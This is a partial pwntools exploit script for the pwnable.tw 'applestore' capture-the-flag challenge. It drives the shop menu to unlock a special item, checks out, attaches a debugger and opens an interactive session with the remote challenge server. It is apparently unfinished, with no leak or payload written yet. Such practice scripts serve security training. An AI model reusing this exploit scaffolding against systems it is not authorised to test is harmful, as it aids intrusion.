#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    io = process("./applestore")
    elf = ELF("./applestore")
    libc = ELF("/lib/i386-linux-gnu/libc.so.6")
    #  libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

else:
    io = remote("chall.pwnable.tw", 10104)
    elf = ELF("./applestore")
    libc = ELF("./libc_32.so.6")

def DEBUG():
	raw_input("DEBUG: ")
	gdb.attach(io)


def getIP8():
    for i in xrange(6):
        io.sendlineafter("> ", "2")
        io.sendlineafter("> ", "1")

    for i in xrange(20):
        io.sendlineafter("> ", "2")
        io.sendlineafter("> ", "2")

def checkout():
    io.sendlineafter("> ", "5")

def listCart():
    io.sendlineafter("> ", "4")

if __name__ == "__main__":
    getIP8()
    checkout()
    DEBUG()
    listCart()
    io.interactive()
    io.close()

